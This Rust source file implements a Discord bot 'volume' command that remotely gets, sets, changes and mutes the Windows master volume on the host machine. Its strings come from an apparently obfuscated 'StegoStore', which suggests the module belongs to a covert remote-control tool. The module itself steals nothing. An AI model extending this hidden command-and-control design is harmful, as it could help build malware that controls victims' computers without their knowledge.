use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

use windows_volume_control::AudioController;

pub struct VolumeCommand;

impl VolumeCommand {
    fn s(k: &str) -> String { StegoStore::get(StringCategory::System, k) }
}

#[async_trait]
impl BotCommand for VolumeCommand {
    fn name(&self) -> &str { "volume" }
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "VOLUME").into_boxed_str())
    }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str {
        Box::leak(Self::s("VOLUME_USAGE").into_boxed_str())
    }
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::s("VOLUME_EX1").into_boxed_str()) as &str,
            Box::leak(Self::s("VOLUME_EX2").into_boxed_str()) as &str,
            Box::leak(Self::s("VOLUME_EX3").into_boxed_str()) as &str,
            Box::leak(Self::s("VOLUME_EX4").into_boxed_str()) as &str,
            Box::leak(Self::s("VOLUME_EX5").into_boxed_str()) as &str,
            Box::leak(Self::s("VOLUME_EX6").into_boxed_str()) as &str,
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] { &["vol"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(action) => action,
            None => {
                http.create_message(msg.channel_id.get(), &Self::s("VOLUME_ERR_USAGE")).await?;
                return Ok(());
            }
        };

        match action {
            "get" => self.get_volume(http, msg).await,
            "set" => {
                let value = match args.next() {
                    Some(v) => v.parse::<f32>().unwrap_or(50.0),
                    None => {
                        http.create_message(msg.channel_id.get(), "**Error**: Please provide a volume level (0-100)").await?;
                        return Ok(());
                    }
                };
                self.set_volume(http, msg, value).await
            }
            "up" => {
                let amount = args.next().and_then(|v| v.parse::<f32>().ok()).unwrap_or(10.0);
                self.change_volume(http, msg, amount, true).await
            }
            "down" => {
                let amount = args.next().and_then(|v| v.parse::<f32>().ok()).unwrap_or(10.0);
                self.change_volume(http, msg, amount, false).await
            }
            "mute"   => self.mute_volume(http, msg, true).await,
            "unmute" => self.mute_volume(http, msg, false).await,
            _ => {
                http.create_message(msg.channel_id.get(), &Self::s("VOLUME_ERR_USAGE")).await?;
                Ok(())
            }
        }
    }
}

impl VolumeCommand {
    fn master() -> String { Self::s("VOLUME_MASTER") }
    fn err_session() -> String { Self::s("VOLUME_ERR_SESSION") }

    async fn get_volume(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let (volume, is_muted, success) = unsafe {
            let mut controller = AudioController::init(None);
            controller.GetSessions();
            controller.GetDefaultAudioEnpointVolumeControl();
            if let Some(session) = controller.get_session_by_name(Self::master()) {
                let vol = session.getVolume() * 100.0;
                let muted = session.getMute();
                (vol, muted, true)
            } else { (0.0, false, false) }
        };
        if success {
            let status = if is_muted { "Muted" } else { "Unmuted" };
            http.create_message(msg.channel_id.get(), &format!("**Current Volume**: {:.0}%\n**Status**: {}", volume, status)).await?;
        } else {
            http.create_message(msg.channel_id.get(), &Self::err_session()).await?;
        }
        Ok(())
    }

    async fn set_volume(&self, http: &Arc<HttpClient>, msg: &Message, level: f32) -> Result<()> {
        if level > 100.0 || level < 0.0 {
            http.create_message(msg.channel_id.get(), "**Error**: Volume must be between 0 and 100").await?;
            return Ok(());
        }
        let success = unsafe {
            let mut controller = AudioController::init(None);
            controller.GetSessions();
            controller.GetDefaultAudioEnpointVolumeControl();
            if let Some(session) = controller.get_session_by_name(Self::master()) {
                session.setVolume(level / 100.0); true
            } else { false }
        };
        if success {
            http.create_message(msg.channel_id.get(), &format!("**Volume set to**: {:.0}%", level)).await?;
        } else {
            http.create_message(msg.channel_id.get(), &Self::err_session()).await?;
        }
        Ok(())
    }

    async fn change_volume(&self, http: &Arc<HttpClient>, msg: &Message, amount: f32, increase: bool) -> Result<()> {
        let (new_volume, success) = unsafe {
            let mut controller = AudioController::init(None);
            controller.GetSessions();
            controller.GetDefaultAudioEnpointVolumeControl();
            if let Some(session) = controller.get_session_by_name(Self::master()) {
                let cur = session.getVolume() * 100.0;
                let nv = if increase { (cur + amount).min(100.0) } else { (cur - amount).max(0.0) };
                session.setVolume(nv / 100.0);
                (nv, true)
            } else { (0.0, false) }
        };
        if success {
            let action = if increase { "increased" } else { "decreased" };
            http.create_message(msg.channel_id.get(), &format!("**Volume {}**: {:.0}%", action, new_volume)).await?;
        } else {
            http.create_message(msg.channel_id.get(), &Self::err_session()).await?;
        }
        Ok(())
    }

    async fn mute_volume(&self, http: &Arc<HttpClient>, msg: &Message, mute: bool) -> Result<()> {
        let success = unsafe {
            let mut controller = AudioController::init(None);
            controller.GetSessions();
            controller.GetDefaultAudioEnpointVolumeControl();
            if let Some(session) = controller.get_session_by_name(Self::master()) {
                session.setMute(mute); true
            } else { false }
        };
        if success {
            let status = if mute { "muted" } else { "unmuted" };
            http.create_message(msg.channel_id.get(), &format!("**Volume {}**", status)).await?;
        } else {
            http.create_message(msg.channel_id.get(), &Self::err_session()).await?;
        }
        Ok(())
    }
}
